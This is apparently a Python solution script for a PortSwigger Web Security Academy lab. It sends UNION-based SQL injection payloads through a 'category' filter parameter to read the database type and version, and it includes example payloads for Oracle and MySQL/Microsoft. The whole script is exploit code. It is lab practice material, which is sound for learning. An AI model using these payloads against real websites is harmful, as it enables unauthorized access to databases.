#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'UNION SELECT banner,NULL FROM v$version--" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'UNION SELECT banner,NULL FROM v$version--" 

1. SQL injection attack, querying the database type and version on Oracle, solution: 'UNION SELECT banner,NULL FROM v$version--

2. SQL injection attack, querying the database type and version on MySQL and Microsoft, solution: 'UNION SELECT @@version,NULL#
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: \'UNION SELECT banner,NULL FROM v$version--, \'UNION SELECT @@version,NULL#', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def sqli(url, command):
    path = '/filter'
    params = {
        'category': 'Gifts' + command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        requests.get(url + path, params=params, verify=False, proxies=proxies)
    else:
        requests.get(url + path, params=params, verify=False)
        r = requests.get(url + path, params=params, verify=False)
        # verify the response returns 200 code
        if (r.status_code == 200):
            print("(+) SQL Injection Successful!")
            subprocess.call(["firefox", url])
        else:
            print("(-) SQL Injection Failed")

def main():
    
    print("(+) Exploiting SQL Injection")
        
    sqli(url, command)

if __name__ == "__main__":
    main()
